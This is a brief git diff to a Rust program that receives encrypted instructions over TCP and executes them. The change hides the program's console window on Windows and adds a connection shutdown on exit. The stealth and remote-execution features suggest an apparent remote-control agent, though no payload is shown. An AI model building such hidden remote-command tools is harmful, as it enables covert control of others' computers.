@@ -1,11 +1,11 @@
-//#![windows_subsystem="windows"]
+#![windows_subsystem="windows"]
 use lazy_static::{lazy_static, initialize as ls_initialize};
 use rand::{thread_rng, RngCore};
 use local_ip_address::local_ip;
 use rsa::{RsaPublicKey, Pkcs1v15Encrypt, pkcs8::DecodePublicKey, PublicKey};
 use aes_gcm_siv::{aead::Aead, Aes256GcmSiv, Nonce, KeyInit};
 use std::{
-    net::{TcpListener, TcpStream},
+    net::{TcpListener, TcpStream, Shutdown},
     io::{self, Write, Read},
     thread,
     time,
@@ -74,7 +74,11 @@ fn handle_client(mut stream : TcpStream) -> io::Result<()> {
         println!("{:#?}", instructions);
         for instruction in instructions {
             match instruction.instruction_type_ {
-                InstructionType::Exit => return Ok(()),
+                InstructionType::Exit => {
+                    println!("[INFO] shutting down connection");
+                    stream.shutdown(Shutdown::Both);
+                    return Ok(());
+                },
                 _ => instruction.execute(),
             }
         }  
